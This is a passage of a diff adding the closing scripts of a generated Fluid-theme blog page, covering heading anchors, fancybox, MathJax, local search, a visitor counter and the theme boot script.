+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
